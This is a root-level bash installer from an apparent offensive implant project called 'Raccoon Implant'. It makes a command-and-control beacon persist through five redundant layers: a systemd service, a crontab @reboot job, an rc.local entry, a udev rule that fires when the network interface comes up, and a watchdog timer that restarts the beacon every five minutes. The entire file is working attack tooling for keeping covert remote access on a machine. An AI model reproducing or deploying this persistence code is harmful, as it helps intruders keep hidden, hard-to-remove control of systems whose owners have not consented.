#!/bin/bash
# Raccoon Implant — Beacon persistence installer
# Installs multiple autorun mechanisms for the C2 beacon:
#   1. systemd service (primary, most reliable)
#   2. crontab @reboot (survives systemd being disabled)
#   3. rc.local (legacy fallback)
#   4. udev network trigger (beacons when interface comes up)
set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] Must run as root (sudo)${NC}"
    exit 1
fi

INSTALL_DIR="/opt/raccoon"
BEACON_CMD="${INSTALL_DIR}/venv/bin/python -m software.c2.beacon_standalone"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(cd "${SCRIPT_DIR}/../.." && pwd)"

echo -e "${YELLOW}[*] Installing beacon persistence mechanisms${NC}"

# ── 1. systemd service (primary) ──
echo -e "${GREEN}[+] Layer 1: systemd service${NC}"
cp "${PROJECT_DIR}/services/raccoon-beacon.service" /etc/systemd/system/
systemctl daemon-reload
systemctl enable raccoon-beacon.service 2>/dev/null
echo "    raccoon-beacon.service enabled"

# ── 2. crontab @reboot (backup) ──
echo -e "${GREEN}[+] Layer 2: crontab @reboot${NC}"
CRON_LINE="@reboot sleep 45 && cd ${INSTALL_DIR} && PYTHONPATH=${INSTALL_DIR} ${BEACON_CMD} >> /dev/null 2>&1"
(crontab -l 2>/dev/null | grep -v "beacon_standalone" ; echo "${CRON_LINE}") | crontab -
echo "    @reboot cron job installed"

# ── 3. rc.local (legacy fallback) ──
echo -e "${GREEN}[+] Layer 3: rc.local${NC}"
RC_LOCAL="/etc/rc.local"

if [ ! -f "$RC_LOCAL" ]; then
    cat > "$RC_LOCAL" <<'RCEOF'
#!/bin/bash
exit 0
RCEOF
    chmod +x "$RC_LOCAL"
fi

RC_LINE="(sleep 60 && cd ${INSTALL_DIR} && PYTHONPATH=${INSTALL_DIR} ${BEACON_CMD}) &"
if ! grep -q "beacon_standalone" "$RC_LOCAL" 2>/dev/null; then
    sed -i "/^exit 0/i ${RC_LINE}" "$RC_LOCAL"
fi
echo "    rc.local entry added"

# ── 4. udev network trigger ──
echo -e "${GREEN}[+] Layer 4: udev network trigger${NC}"
UPSTREAM=$(grep -oP 'upstream_iface:\s*"\K[^"]+' "${INSTALL_DIR}/configs/raccoon.yaml" 2>/dev/null || echo "eth0")
cat > /etc/udev/rules.d/99-raccoon-beacon.rules <<EOF
ACTION=="add", SUBSYSTEM=="net", KERNEL=="${UPSTREAM}", RUN+="/bin/bash -c '(sleep 30 && cd ${INSTALL_DIR} && PYTHONPATH=${INSTALL_DIR} ${BEACON_CMD}) &'"
EOF
udevadm control --reload-rules 2>/dev/null || true
echo "    udev rule for ${UPSTREAM} installed"

# ── 5. Systemd timer (watchdog for beacon) ──
echo -e "${GREEN}[+] Layer 5: systemd timer watchdog${NC}"
cat > /etc/systemd/system/raccoon-beacon-check.service <<EOF
[Unit]
Description=Raccoon Beacon health check — restart if dead

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'systemctl is-active --quiet raccoon-beacon.service || systemctl restart raccoon-beacon.service'
EOF

cat > /etc/systemd/system/raccoon-beacon-check.timer <<EOF
[Unit]
Description=Check raccoon-beacon every 5 minutes

[Timer]
OnBootSec=120
OnUnitActiveSec=300
Persistent=true

[Install]
WantedBy=timers.target
EOF

systemctl daemon-reload
systemctl enable raccoon-beacon-check.timer 2>/dev/null
echo "    Beacon watchdog timer enabled (every 5 min)"

echo ""
echo -e "${GREEN}============================================${NC}"
echo -e "${GREEN}  Beacon persistence installed${NC}"
echo -e "${GREEN}============================================${NC}"
echo ""
echo -e "${YELLOW}Persistence layers:${NC}"
echo "  1. systemd  — raccoon-beacon.service (auto-restart, 30s delay)"
echo "  2. crontab  — @reboot (45s delay)"
echo "  3. rc.local — legacy boot (60s delay)"
echo "  4. udev     — triggers on ${UPSTREAM} interface up (30s delay)"
echo "  5. timer    — systemd timer restarts beacon every 5 min if dead"
echo ""
echo -e "${YELLOW}Staggered delays prevent all instances from racing.${NC}"
echo -e "${YELLOW}PID lock file (/tmp/.raccoon_beacon.pid) prevents duplicates.${NC}"
echo ""
